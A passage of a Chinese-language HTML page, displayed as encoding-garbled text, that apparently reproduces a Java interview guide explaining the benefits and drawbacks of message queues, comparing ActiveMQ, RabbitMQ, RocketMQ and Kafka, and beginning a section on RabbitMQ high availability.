å»è¿›è¡Œç³»ç»Ÿçš„è§£è€¦ã€‚åœ¨ç®€å†ä¸­ä½“ç°å‡ºæ¥è¿™å—ä¸œè¥¿ï¼Œç”¨ MQ ä½œè§£è€¦ã€‚</p><h4><span id="å¼‚æ­¥">å¼‚æ­¥</span></h4><p>å†æ¥çœ‹ä¸€ä¸ªåœºæ™¯ï¼ŒA ç³»ç»Ÿæ¥æ”¶ä¸€ä¸ªè¯·æ±‚ï¼Œéœ€è¦åœ¨è‡ªå·±æœ¬åœ°å†™åº“ï¼Œè¿˜éœ€è¦åœ¨ BCD ä¸‰ä¸ªç³»ç»Ÿå†™åº“ï¼Œè‡ªå·±æœ¬åœ°å†™åº“è¦ 3msï¼ŒBCD ä¸‰ä¸ªç³»ç»Ÿåˆ†åˆ«å†™åº“è¦ 300msã€450msã€200msã€‚æœ€ç»ˆè¯·æ±‚æ€»å»¶æ—¶æ˜¯ 3 + 300 + 450 + 200 &#x3D; 953msï¼Œæ¥è¿‘ 1sï¼Œç”¨æˆ·æ„Ÿè§‰æä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œæ…¢æ­»äº†æ…¢æ­»äº†ã€‚ç”¨æˆ·é€šè¿‡æµè§ˆå™¨å‘èµ·è¯·æ±‚ï¼Œç­‰å¾…ä¸ª 1sï¼Œè¿™å‡ ä¹æ˜¯ä¸å¯æ¥å—çš„ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-3.png" alt="mq-3"></p><p>ä¸€èˆ¬äº’è”ç½‘ç±»çš„ä¼ä¸šï¼Œå¯¹äºç”¨æˆ·ç›´æ¥çš„æ“ä½œï¼Œä¸€èˆ¬è¦æ±‚æ˜¯æ¯ä¸ªè¯·æ±‚éƒ½å¿…é¡»åœ¨ 200 ms ä»¥å†…å®Œæˆï¼Œå¯¹ç”¨æˆ·å‡ ä¹æ˜¯æ— æ„ŸçŸ¥çš„ã€‚</p><p>å¦‚æœ<strong>ä½¿ç”¨ MQ</strong>ï¼Œé‚£ä¹ˆ A ç³»ç»Ÿè¿ç»­å‘é€ 3 æ¡æ¶ˆæ¯åˆ° MQ é˜Ÿåˆ—ä¸­ï¼Œå‡å¦‚è€—æ—¶ 5msï¼ŒA ç³»ç»Ÿä»æ¥å—ä¸€ä¸ªè¯·æ±‚åˆ°è¿”å›å“åº”ç»™ç”¨æˆ·ï¼Œæ€»æ—¶é•¿æ˜¯ 3 + 5 &#x3D; 8msï¼Œå¯¹äºç”¨æˆ·è€Œè¨€ï¼Œå…¶å®æ„Ÿè§‰ä¸Šå°±æ˜¯ç‚¹ä¸ªæŒ‰é’®ï¼Œ8ms ä»¥åå°±ç›´æ¥è¿”å›äº†ï¼Œçˆ½ï¼ç½‘ç«™åšå¾—çœŸå¥½ï¼ŒçœŸå¿«ï¼</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-4.png" alt="mq-4"></p><h4><span id="å‰Šå³°">å‰Šå³°</span></h4><p>æ¯å¤© 0:00 åˆ° 12:00ï¼ŒA ç³»ç»Ÿé£å¹³æµªé™ï¼Œæ¯ç§’å¹¶å‘è¯·æ±‚æ•°é‡å°± 50 ä¸ªã€‚ç»“æœæ¯æ¬¡ä¸€åˆ° 12:00 ~ 13:00 ï¼Œæ¯ç§’å¹¶å‘è¯·æ±‚æ•°é‡çªç„¶ä¼šæš´å¢åˆ° 5k+ æ¡ã€‚ä½†æ˜¯ç³»ç»Ÿæ˜¯ç›´æ¥åŸºäº MySQL çš„ï¼Œå¤§é‡çš„è¯·æ±‚æ¶Œå…¥ MySQLï¼Œæ¯ç§’é’Ÿå¯¹ MySQL æ‰§è¡Œçº¦ 5k æ¡ SQLã€‚</p><p>ä¸€èˆ¬çš„ MySQLï¼Œæ‰›åˆ°æ¯ç§’ 2k ä¸ªè¯·æ±‚å°±å·®ä¸å¤šäº†ï¼Œå¦‚æœæ¯ç§’è¯·æ±‚åˆ° 5k çš„è¯ï¼Œå¯èƒ½å°±ç›´æ¥æŠŠ MySQL ç»™æ‰“æ­»äº†ï¼Œå¯¼è‡´ç³»ç»Ÿå´©æºƒï¼Œç”¨æˆ·ä¹Ÿå°±æ²¡æ³•å†ä½¿ç”¨ç³»ç»Ÿäº†ã€‚</p><p>ä½†æ˜¯é«˜å³°æœŸä¸€è¿‡ï¼Œåˆ°äº†ä¸‹åˆçš„æ—¶å€™ï¼Œå°±æˆäº†ä½å³°æœŸï¼Œå¯èƒ½ä¹Ÿå°± 1w çš„ç”¨æˆ·åŒæ—¶åœ¨ç½‘ç«™ä¸Šæ“ä½œï¼Œæ¯ç§’ä¸­çš„è¯·æ±‚æ•°é‡å¯èƒ½ä¹Ÿå°± 50 ä¸ªè¯·æ±‚ï¼Œå¯¹æ•´ä¸ªç³»ç»Ÿå‡ ä¹æ²¡æœ‰ä»»ä½•çš„å‹åŠ›ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-5.png" alt="mq-5"></p><p>å¦‚æœä½¿ç”¨ MQï¼Œæ¯ç§’ 5k ä¸ªè¯·æ±‚å†™å…¥ MQï¼ŒA ç³»ç»Ÿæ¯ç§’é’Ÿæœ€å¤šå¤„ç† 2k ä¸ªè¯·æ±‚ï¼Œå› ä¸º MySQL æ¯ç§’é’Ÿæœ€å¤šå¤„ç† 2k ä¸ªã€‚A ç³»ç»Ÿä» MQ ä¸­æ…¢æ…¢æ‹‰å–è¯·æ±‚ï¼Œæ¯ç§’é’Ÿå°±æ‹‰å– 2k ä¸ªè¯·æ±‚ï¼Œä¸è¦è¶…è¿‡è‡ªå·±æ¯ç§’èƒ½å¤„ç†çš„æœ€å¤§è¯·æ±‚æ•°é‡å°± okï¼Œè¿™æ ·ä¸‹æ¥ï¼Œå“ªæ€•æ˜¯é«˜å³°æœŸçš„æ—¶å€™ï¼ŒA ç³»ç»Ÿä¹Ÿç»å¯¹ä¸ä¼šæŒ‚æ‰ã€‚è€Œ MQ æ¯ç§’é’Ÿ 5k ä¸ªè¯·æ±‚è¿›æ¥ï¼Œå°± 2k ä¸ªè¯·æ±‚å‡ºå»ï¼Œç»“æœå°±å¯¼è‡´åœ¨ä¸­åˆé«˜å³°æœŸï¼ˆ1 ä¸ªå°æ—¶ï¼‰ï¼Œå¯èƒ½æœ‰å‡ åä¸‡ç”šè‡³å‡ ç™¾ä¸‡çš„è¯·æ±‚ç§¯å‹åœ¨ MQ ä¸­ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-6.png" alt="mq-6"></p><p>è¿™ä¸ªçŸ­æš‚çš„é«˜å³°æœŸç§¯å‹æ˜¯ ok çš„ï¼Œå› ä¸ºé«˜å³°æœŸè¿‡äº†ä¹‹åï¼Œæ¯ç§’é’Ÿå°± 50 ä¸ªè¯·æ±‚è¿› MQï¼Œä½†æ˜¯ A ç³»ç»Ÿä¾ç„¶ä¼šæŒ‰ç…§æ¯ç§’ 2k ä¸ªè¯·æ±‚çš„é€Ÿåº¦åœ¨å¤„ç†ã€‚æ‰€ä»¥è¯´ï¼Œåªè¦é«˜å³°æœŸä¸€è¿‡ï¼ŒA ç³»ç»Ÿå°±ä¼šå¿«é€Ÿå°†ç§¯å‹çš„æ¶ˆæ¯ç»™è§£å†³æ‰ã€‚</p><h3><span id="æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹">æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹</span></h3><p>ä¼˜ç‚¹ä¸Šé¢å·²ç»è¯´äº†ï¼Œå°±æ˜¯<strong>åœ¨ç‰¹æ®Šåœºæ™¯ä¸‹æœ‰å…¶å¯¹åº”çš„å¥½å¤„</strong>ï¼Œ<strong>è§£è€¦</strong>ã€<strong>å¼‚æ­¥</strong>ã€<strong>å‰Šå³°</strong>ã€‚</p><p>ç¼ºç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li><p>ç³»ç»Ÿå¯ç”¨æ€§é™ä½<br><br>ç³»ç»Ÿå¼•å…¥çš„å¤–éƒ¨ä¾èµ–è¶Šå¤šï¼Œè¶Šå®¹æ˜“æŒ‚æ‰ã€‚æœ¬æ¥ä½ å°±æ˜¯ A ç³»ç»Ÿè°ƒç”¨ BCD ä¸‰ä¸ªç³»ç»Ÿçš„æ¥å£å°±å¥½äº†ï¼ŒABCD å››ä¸ªç³»ç»Ÿè¿˜å¥½å¥½çš„ï¼Œæ²¡å•¥é—®é¢˜ï¼Œä½ ååŠ ä¸ª MQ è¿›æ¥ï¼Œä¸‡ä¸€ MQ æŒ‚äº†å’‹æ•´ï¼ŸMQ ä¸€æŒ‚ï¼Œæ•´å¥—ç³»ç»Ÿå´©æºƒï¼Œä½ ä¸å°±å®Œäº†ï¼Ÿå¦‚ä½•ä¿è¯æ¶ˆæ¯é˜Ÿåˆ—çš„é«˜å¯ç”¨ï¼Œå¯ä»¥<a href="/docs/high-concurrency/how-to-ensure-high-availability-of-message-queues.md">ç‚¹å‡»è¿™é‡ŒæŸ¥çœ‹</a>ã€‚</p></li><li><p>ç³»ç»Ÿå¤æ‚åº¦æé«˜<br><br>ç¡¬ç”Ÿç”ŸåŠ ä¸ª MQ è¿›æ¥ï¼Œä½ æ€ä¹ˆ<a href="/docs/high-concurrency/how-to-ensure-that-messages-are-not-repeatedly-consumed.md">ä¿è¯æ¶ˆæ¯æ²¡æœ‰é‡å¤æ¶ˆè´¹</a>ï¼Ÿæ€ä¹ˆ<a href="/docs/high-concurrency/how-to-ensure-the-reliable-transmission-of-messages.md">å¤„ç†æ¶ˆæ¯ä¸¢å¤±çš„æƒ…å†µ</a>ï¼Ÿæ€ä¹ˆä¿è¯æ¶ˆæ¯ä¼ é€’çš„é¡ºåºæ€§ï¼Ÿå¤´å¤§å¤´å¤§ï¼Œé—®é¢˜ä¸€å¤§å †ï¼Œç—›è‹¦ä¸å·²ã€‚</p></li><li><p>ä¸€è‡´æ€§é—®é¢˜<br><br>A ç³»ç»Ÿå¤„ç†å®Œäº†ç›´æ¥è¿”å›æˆåŠŸäº†ï¼Œäººéƒ½ä»¥ä¸ºä½ è¿™ä¸ªè¯·æ±‚å°±æˆåŠŸäº†ï¼›ä½†æ˜¯é—®é¢˜æ˜¯ï¼Œè¦æ˜¯ BCD ä¸‰ä¸ªç³»ç»Ÿé‚£é‡Œï¼ŒBD ä¸¤ä¸ªç³»ç»Ÿå†™åº“æˆåŠŸäº†ï¼Œç»“æœ C ç³»ç»Ÿå†™åº“å¤±è´¥äº†ï¼Œå’‹æ•´ï¼Ÿä½ è¿™æ•°æ®å°±ä¸ä¸€è‡´äº†ã€‚</p></li></ul><p>æ‰€ä»¥æ¶ˆæ¯é˜Ÿåˆ—å®é™…æ˜¯ä¸€ç§éå¸¸å¤æ‚çš„æ¶æ„ï¼Œä½ å¼•å…¥å®ƒæœ‰å¾ˆå¤šå¥½å¤„ï¼Œä½†æ˜¯ä¹Ÿå¾—é’ˆå¯¹å®ƒå¸¦æ¥çš„åå¤„åšå„ç§é¢å¤–çš„æŠ€æœ¯æ–¹æ¡ˆå’Œæ¶æ„æ¥è§„é¿æ‰ï¼Œåšå¥½ä¹‹åï¼Œä½ ä¼šå‘ç°ï¼Œå¦ˆå‘€ï¼Œç³»ç»Ÿå¤æ‚åº¦æå‡äº†ä¸€ä¸ªæ•°é‡çº§ï¼Œä¹Ÿè®¸æ˜¯å¤æ‚äº† 10 å€ã€‚ä½†æ˜¯å…³é”®æ—¶åˆ»ï¼Œç”¨ï¼Œè¿˜æ˜¯å¾—ç”¨çš„ã€‚</p><h3><span id="kafka-activemq-rabbitmq-rocketmq-æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹">Kafkaã€ActiveMQã€RabbitMQã€RocketMQ æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ</span></h3><table><thead><tr><th>ç‰¹æ€§</th><th>ActiveMQ</th><th>RabbitMQ</th><th>RocketMQ</th><th>Kafka</th></tr></thead><tbody><tr><td>å•æœºååé‡</td><td>ä¸‡çº§ï¼Œæ¯” RocketMQã€Kafka ä½ä¸€ä¸ªæ•°é‡çº§</td><td>åŒ ActiveMQ</td><td>10 ä¸‡çº§ï¼Œæ”¯æ’‘é«˜åå</td><td>10 ä¸‡çº§ï¼Œé«˜ååï¼Œä¸€èˆ¬é…åˆå¤§æ•°æ®ç±»çš„ç³»ç»Ÿæ¥è¿›è¡Œå®æ—¶æ•°æ®è®¡ç®—ã€æ—¥å¿—é‡‡é›†ç­‰åœºæ™¯</td></tr><tr><td>topic æ•°é‡å¯¹ååé‡çš„å½±å“</td><td></td><td></td><td>topic å¯ä»¥è¾¾åˆ°å‡ ç™¾&#x2F;å‡ åƒçš„çº§åˆ«ï¼Œååé‡ä¼šæœ‰è¾ƒå°å¹…åº¦çš„ä¸‹é™ï¼Œè¿™æ˜¯ RocketMQ çš„ä¸€å¤§ä¼˜åŠ¿ï¼Œåœ¨åŒç­‰æœºå™¨ä¸‹ï¼Œå¯ä»¥æ”¯æ’‘å¤§é‡çš„ topic</td><td>topic ä»å‡ ååˆ°å‡ ç™¾ä¸ªæ—¶å€™ï¼Œååé‡ä¼šå¤§å¹…åº¦ä¸‹é™ï¼Œåœ¨åŒç­‰æœºå™¨ä¸‹ï¼ŒKafka å°½é‡ä¿è¯ topic æ•°é‡ä¸è¦è¿‡å¤šï¼Œå¦‚æœè¦æ”¯æ’‘å¤§è§„æ¨¡çš„ topicï¼Œéœ€è¦å¢åŠ æ›´å¤šçš„æœºå™¨èµ„æº</td></tr><tr><td>æ—¶æ•ˆæ€§</td><td>ms çº§</td><td>å¾®ç§’çº§ï¼Œè¿™æ˜¯ RabbitMQ çš„ä¸€å¤§ç‰¹ç‚¹ï¼Œå»¶è¿Ÿæœ€ä½</td><td>ms çº§</td><td>å»¶è¿Ÿåœ¨ ms çº§ä»¥å†…</td></tr><tr><td>å¯ç”¨æ€§</td><td>é«˜ï¼ŒåŸºäºä¸»ä»æ¶æ„å®ç°é«˜å¯ç”¨</td><td>åŒ ActiveMQ</td><td>éå¸¸é«˜ï¼Œåˆ†å¸ƒå¼æ¶æ„</td><td>éå¸¸é«˜ï¼Œåˆ†å¸ƒå¼ï¼Œä¸€ä¸ªæ•°æ®å¤šä¸ªå‰¯æœ¬ï¼Œå°‘æ•°æœºå™¨å®•æœºï¼Œä¸ä¼šä¸¢å¤±æ•°æ®ï¼Œä¸ä¼šå¯¼è‡´ä¸å¯ç”¨</td></tr><tr><td>æ¶ˆæ¯å¯é æ€§</td><td>æœ‰è¾ƒä½çš„æ¦‚ç‡ä¸¢å¤±æ•°æ®</td><td>åŸºæœ¬ä¸ä¸¢</td><td>ç»è¿‡å‚æ•°ä¼˜åŒ–é…ç½®ï¼Œå¯ä»¥åšåˆ° 0 ä¸¢å¤±</td><td>åŒ RocketMQ</td></tr><tr><td>åŠŸèƒ½æ”¯æŒ</td><td>MQ é¢†åŸŸçš„åŠŸèƒ½æå…¶å®Œå¤‡</td><td>åŸºäº erlang å¼€å‘ï¼Œå¹¶å‘èƒ½åŠ›å¾ˆå¼ºï¼Œæ€§èƒ½æå¥½ï¼Œå»¶æ—¶å¾ˆä½</td><td>MQ åŠŸèƒ½è¾ƒä¸ºå®Œå–„ï¼Œè¿˜æ˜¯åˆ†å¸ƒå¼çš„ï¼Œæ‰©å±•æ€§å¥½</td><td>åŠŸèƒ½è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ”¯æŒç®€å•çš„ MQ åŠŸèƒ½ï¼Œåœ¨å¤§æ•°æ®é¢†åŸŸçš„å®æ—¶è®¡ç®—ä»¥åŠæ—¥å¿—é‡‡é›†è¢«å¤§è§„æ¨¡ä½¿ç”¨</td></tr></tbody></table><p>ç»¼ä¸Šï¼Œå„ç§å¯¹æ¯”ä¹‹åï¼Œæœ‰å¦‚ä¸‹å»ºè®®ï¼š</p><p>ä¸€èˆ¬çš„ä¸šåŠ¡ç³»ç»Ÿè¦å¼•å…¥ MQï¼Œæœ€æ—©å¤§å®¶éƒ½ç”¨ ActiveMQï¼Œä½†æ˜¯ç°åœ¨ç¡®å®å¤§å®¶ç”¨çš„ä¸å¤šäº†ï¼Œæ²¡ç»è¿‡å¤§è§„æ¨¡ååé‡åœºæ™¯çš„éªŒè¯ï¼Œç¤¾åŒºä¹Ÿä¸æ˜¯å¾ˆæ´»è·ƒï¼Œæ‰€ä»¥å¤§å®¶è¿˜æ˜¯ç®—äº†å§ï¼Œæˆ‘ä¸ªäººä¸æ¨èç”¨è¿™ä¸ªäº†ï¼›</p><p>åæ¥å¤§å®¶å¼€å§‹ç”¨ RabbitMQï¼Œä½†æ˜¯ç¡®å® erlang è¯­è¨€é˜»æ­¢äº†å¤§é‡çš„ Java å·¥ç¨‹å¸ˆå»æ·±å…¥ç ”ç©¶å’ŒæŒæ§å®ƒï¼Œå¯¹å…¬å¸è€Œè¨€ï¼Œå‡ ä¹å¤„äºä¸å¯æ§çš„çŠ¶æ€ï¼Œä½†æ˜¯ç¡®å®äººå®¶æ˜¯å¼€æºçš„ï¼Œæ¯”è¾ƒç¨³å®šçš„æ”¯æŒï¼Œæ´»è·ƒåº¦ä¹Ÿé«˜ï¼›</p><p>ä¸è¿‡ç°åœ¨ç¡®å®è¶Šæ¥è¶Šå¤šçš„å…¬å¸ä¼šå»ç”¨ RocketMQï¼Œç¡®å®å¾ˆä¸é”™ï¼Œæ¯•ç«Ÿæ˜¯é˜¿é‡Œå‡ºå“ï¼Œä½†ç¤¾åŒºå¯èƒ½æœ‰çªç„¶é»„æ‰çš„é£é™©ï¼ˆç›®å‰ RocketMQ å·²æç»™ <a href="https://github.com/apache/rocketmq">Apache</a>ï¼Œä½† GitHub ä¸Šçš„æ´»è·ƒåº¦å…¶å®ä¸ç®—é«˜ï¼‰å¯¹è‡ªå·±å…¬å¸æŠ€æœ¯å®åŠ›æœ‰ç»å¯¹è‡ªä¿¡çš„ï¼Œæ¨èç”¨ RocketMQï¼Œå¦åˆ™å›å»è€è€å®å®ç”¨ RabbitMQ å§ï¼Œäººå®¶æœ‰æ´»è·ƒçš„å¼€æºç¤¾åŒºï¼Œç»å¯¹ä¸ä¼šé»„ã€‚</p><p>æ‰€ä»¥<strong>ä¸­å°å‹å…¬å¸</strong>ï¼ŒæŠ€æœ¯å®åŠ›è¾ƒä¸ºä¸€èˆ¬ï¼ŒæŠ€æœ¯æŒ‘æˆ˜ä¸æ˜¯ç‰¹åˆ«é«˜ï¼Œç”¨ RabbitMQ æ˜¯ä¸é”™çš„é€‰æ‹©ï¼›<strong>å¤§å‹å…¬å¸</strong>ï¼ŒåŸºç¡€æ¶æ„ç ”å‘å®åŠ›è¾ƒå¼ºï¼Œç”¨ RocketMQ æ˜¯å¾ˆå¥½çš„é€‰æ‹©ã€‚</p><p>å¦‚æœæ˜¯<strong>å¤§æ•°æ®é¢†åŸŸ</strong>çš„å®æ—¶è®¡ç®—ã€æ—¥å¿—é‡‡é›†ç­‰åœºæ™¯ï¼Œç”¨ Kafka æ˜¯ä¸šå†…æ ‡å‡†çš„ï¼Œç»å¯¹æ²¡é—®é¢˜ï¼Œç¤¾åŒºæ´»è·ƒåº¦å¾ˆé«˜ï¼Œç»å¯¹ä¸ä¼šé»„ï¼Œä½•å†µå‡ ä¹æ˜¯å…¨ä¸–ç•Œè¿™ä¸ªé¢†åŸŸçš„äº‹å®æ€§è§„èŒƒã€‚</p><h1><span id="å¦‚ä½•ä¿è¯æ¶ˆæ¯é˜Ÿåˆ—çš„é«˜å¯ç”¨">å¦‚ä½•ä¿è¯æ¶ˆæ¯é˜Ÿåˆ—çš„é«˜å¯ç”¨ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å¦‚æœæœ‰äººé—®åˆ°ä½  MQ çš„çŸ¥è¯†ï¼Œ<strong>é«˜å¯ç”¨æ˜¯å¿…é—®çš„</strong>ã€‚ä¸Šä¸€è®²æåˆ°ï¼ŒMQ ä¼šå¯¼è‡´<strong>ç³»ç»Ÿå¯ç”¨æ€§é™ä½</strong>ã€‚æ‰€ä»¥åªè¦ä½ ç”¨äº† MQï¼Œæ¥ä¸‹æ¥é—®çš„ä¸€äº›è¦ç‚¹è‚¯å®šå°±æ˜¯å›´ç»•ç€ MQ çš„é‚£äº›ç¼ºç‚¹æ€ä¹ˆæ¥è§£å†³äº†ã€‚</p><p>è¦æ˜¯ä½ å‚»ä¹ä¹çš„å°±å¹²ç”¨äº†ä¸€ä¸ª MQï¼Œå„ç§é—®é¢˜ä»æ¥æ²¡è€ƒè™‘è¿‡ï¼Œé‚£ä½ å°±æ¯å…·äº†ï¼Œé¢è¯•å®˜å¯¹ä½ çš„æ„Ÿè§‰å°±æ˜¯ï¼Œåªä¼šç®€å•ä½¿ç”¨ä¸€äº›æŠ€æœ¯ï¼Œæ²¡ä»»ä½•æ€è€ƒï¼Œé©¬ä¸Šå¯¹ä½ çš„å°è±¡å°±ä¸å¤ªå¥½äº†ã€‚è¿™æ ·çš„åŒå­¦æ‹›è¿›æ¥è¦æ˜¯åšä¸ª 20k è–ªèµ„ä»¥å†…çš„æ™®é€šå°å¼Ÿè¿˜å‡‘åˆï¼Œè¦æ˜¯åšè–ªèµ„ 20k+ çš„é«˜å·¥ï¼Œé‚£å°±æƒ¨äº†ï¼Œè®©ä½ è®¾è®¡ä¸ªç³»ç»Ÿï¼Œé‡Œé¢è‚¯å®šä¸€å †å‘ï¼Œå‡ºäº†äº‹æ•…å…¬å¸å—æŸå¤±ï¼Œå›¢é˜Ÿä¸€èµ·èƒŒé”…ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>è¿™ä¸ªé—®é¢˜è¿™ä¹ˆé—®æ˜¯å¾ˆå¥½çš„ï¼Œå› ä¸ºä¸èƒ½é—®ä½  Kafka çš„é«˜å¯ç”¨æ€§æ€ä¹ˆä¿è¯ï¼ŸActiveMQ çš„é«˜å¯ç”¨æ€§æ€ä¹ˆä¿è¯ï¼Ÿä¸€ä¸ªé¢è¯•å®˜è¦æ˜¯è¿™ä¹ˆé—®å°±æ˜¾å¾—å¾ˆæ²¡æ°´å¹³ï¼Œäººå®¶å¯èƒ½ç”¨çš„å°±æ˜¯ RabbitMQï¼Œæ²¡ç”¨è¿‡ Kafkaï¼Œä½ ä¸Šæ¥é—®äººå®¶ Kafka å¹²ä»€ä¹ˆï¼Ÿè¿™ä¸æ˜¯æ‘†æ˜äº†åˆéš¾äººä¹ˆã€‚</p><p>æ‰€ä»¥æœ‰æ°´å¹³çš„é¢è¯•å®˜ï¼Œé—®çš„æ˜¯ MQ çš„é«˜å¯ç”¨æ€§æ€ä¹ˆä¿è¯ï¼Ÿè¿™æ ·å°±æ˜¯ä½ ç”¨è¿‡å“ªä¸ª MQï¼Œä½ å°±è¯´è¯´ä½ å¯¹é‚£ä¸ª MQ çš„é«˜å¯ç”¨æ€§çš„ç†è§£ã€‚</p><h3><span id="rabbitmq-çš„é«˜å¯ç”¨æ€§">RabbitMQ çš„é«˜å¯ç”¨æ€§</span></h3><p>RabbitMQ æ˜¯æ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„ï¼Œå› ä¸ºæ˜¯<strong>åŸºäºä¸»ä»</strong>ï¼ˆéåˆ†å¸ƒå¼ï¼‰åšé«˜å¯ç”¨æ€§çš„ï¼Œæˆ‘ä»¬å°±ä»¥ RabbitMQ ä¸ºä¾‹å­è®²è§£ç¬¬ä¸€ç§ MQ çš„é«˜å¯ç”¨æ€§æ€ä¹ˆå®ç°ã€‚</p><p>RabbitMQ æœ‰ä¸‰ç§æ¨¡å¼ï¼šå•æœºæ¨¡å¼ã€æ™®é€šé›†ç¾¤æ¨¡å¼ã€é•œåƒé›†ç¾¤æ¨¡å¼ã€‚</p><h4><span id="å•æœºæ¨¡å¼">å•æœºæ¨¡å¼</span></h4><p>å•æœºæ¨¡å¼ï¼Œå°±æ˜¯ Demo çº§åˆ«çš„ï¼Œä¸€èˆ¬å°±æ˜¯ä½ æœ¬åœ°å¯åŠ¨äº†ç©ç©å„¿çš„ğŸ˜„ï¼Œæ²¡äººç”Ÿäº§ç”¨å•æœºæ¨¡å¼ã€‚</p><h4><span id="æ™®é€šé›†ç¾¤æ¨¡å¼æ— é«˜å¯ç”¨æ€§">æ™®é€šé›†ç¾¤æ¨¡å¼ï¼ˆæ— é«˜å¯ç”¨æ€§ï¼‰</span></h4><p>æ™®é€šé›†ç¾¤æ¨¡å¼ï¼Œæ„æ€å°±æ˜¯åœ¨å¤šå°æœºå™¨ä¸Šå¯åŠ¨å¤šä¸ª RabbitMQ å®ä¾‹ï¼Œæ¯ä¸ªæœºå™¨å¯åŠ¨ä¸€ä¸ªã€‚ä½ <strong>åˆ›å»ºçš„ queueï¼Œåªä¼šæ”¾åœ¨ä¸€ä¸ª RabbitMQ å®ä¾‹ä¸Š</strong>ï¼Œä½†æ˜¯æ¯ä¸ªå®ä¾‹éƒ½åŒæ­¥ queue çš„å…ƒæ•°æ®ï¼ˆå…ƒæ•°æ®å¯ä»¥è®¤ä¸ºæ˜¯ queue çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œé€šè¿‡å…ƒæ•°æ®ï¼Œå¯ä»¥æ‰¾åˆ° queue æ‰€åœ¨å®ä¾‹ï¼‰ã€‚ä½ æ¶ˆè´¹çš„æ—¶å€™ï¼Œå®é™…ä¸Šå¦‚æœè¿æ¥åˆ°äº†å¦å¤–ä¸€ä¸ªå®ä¾‹ï¼Œé‚£ä¹ˆé‚£ä¸ªå®ä¾‹ä¼šä» queue æ‰€åœ¨å®ä¾‹ä¸Šæ‹‰å–æ•°æ®è¿‡æ¥ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-7.png" alt="mq-7"></p><p>è¿™ç§æ–¹å¼ç¡®å®å¾ˆéº»çƒ¦ï¼Œä¹Ÿä¸æ€ä¹ˆå¥½ï¼Œ<strong>æ²¡åšåˆ°æ‰€è°“çš„åˆ†å¸ƒå¼</strong>ï¼Œå°±æ˜¯ä¸ªæ™®é€šé›†ç¾¤ã€‚å› ä¸ºè¿™å¯¼è‡´ä½ è¦ä¹ˆæ¶ˆè´¹è€…æ¯æ¬¡éšæœºè¿æ¥ä¸€ä¸ªå®ä¾‹ç„¶åæ‹‰å–æ•°æ®ï¼Œè¦ä¹ˆå›ºå®šè¿æ¥é‚£ä¸ª queue æ‰€åœ¨å®ä¾‹æ¶ˆè´¹æ•°æ®ï¼Œå‰è€…æœ‰<strong>æ•°æ®æ‹‰å–çš„å¼€é”€</strong>ï¼Œåè€…å¯¼è‡´<strong>å•å®ä¾‹æ€§èƒ½ç“¶é¢ˆ</strong>ã€‚</p><p>è€Œä¸”å¦‚æœé‚£ä¸ªæ”¾ queue çš„å®ä¾‹å®•æœºäº†ï¼Œä¼šå¯¼è‡´æ¥ä¸‹æ¥å…¶ä»–å®ä¾‹å°±æ— æ³•ä»é‚£ä¸ªå®ä¾‹æ‹‰å–ï¼Œå¦‚æœä½ <strong>å¼€å¯äº†æ¶ˆæ¯æŒä¹…åŒ–</strong>ï¼Œè®© RabbitMQ è½åœ°å­˜å‚¨æ¶ˆæ¯çš„è¯ï¼Œ<strong>æ¶ˆæ¯ä¸ä¸€å®šä¼šä¸¢</strong>ï¼Œå¾—ç­‰è¿™ä¸ªå®ä¾‹æ¢å¤äº†ï¼Œç„¶åæ‰å¯ä»¥ç»§ç»­ä»è¿™ä¸ª queue æ‹‰å–æ•°æ®ã€‚</p><p>æ‰€ä»¥è¿™ä¸ªäº‹å„¿å°±æ¯”è¾ƒå°´å°¬äº†ï¼Œè¿™å°±<strong>æ²¡æœ‰ä»€ä¹ˆæ‰€è°“çš„é«˜å¯ç”¨æ€§</strong>ï¼Œ<strong>è¿™æ–¹æ¡ˆä¸»è¦æ˜¯æé«˜ååé‡çš„</strong>ï¼Œå°±æ˜¯è¯´è®©é›†ç¾¤ä¸­å¤šä¸ªèŠ‚ç‚¹æ¥æœåŠ¡æŸä¸ª queue çš„è¯»å†™æ“ä½œã€‚</p><h4><span id="é•œåƒé›†ç¾¤æ¨¡å¼é«˜å¯ç”¨æ€§">é•œåƒé›†ç¾¤æ¨¡å¼ï¼ˆé«˜å¯ç”¨æ€§ï¼‰</span></h4><p>è¿™ç§æ¨¡å¼ï¼Œæ‰æ˜¯æ‰€è°“çš„ RabbitMQ çš„é«˜å¯ç”¨æ¨¡å¼ã€‚è·Ÿæ™®é€šé›†ç¾¤æ¨¡å¼ä¸ä¸€æ ·çš„æ˜¯ï¼Œåœ¨é•œåƒé›†ç¾¤æ¨¡å¼ä¸‹ï¼Œä½ åˆ›å»ºçš„ queueï¼Œæ— è®ºå…ƒæ•°æ®è¿˜æ˜¯ queue é‡Œçš„æ¶ˆæ¯éƒ½ä¼š<strong>å­˜åœ¨äºå¤šä¸ªå®ä¾‹ä¸Š</strong>ï¼Œå°±æ˜¯è¯´ï¼Œæ¯ä¸ª RabbitMQ èŠ‚ç‚¹éƒ½æœ‰è¿™ä¸ª queue çš„ä¸€ä¸ª<strong>å®Œæ•´é•œåƒ</strong>ï¼ŒåŒ…å« queue çš„å…¨éƒ¨æ•°æ®çš„æ„æ€ã€‚ç„¶åæ¯æ¬¡ä½ å†™æ¶ˆæ¯åˆ° queue 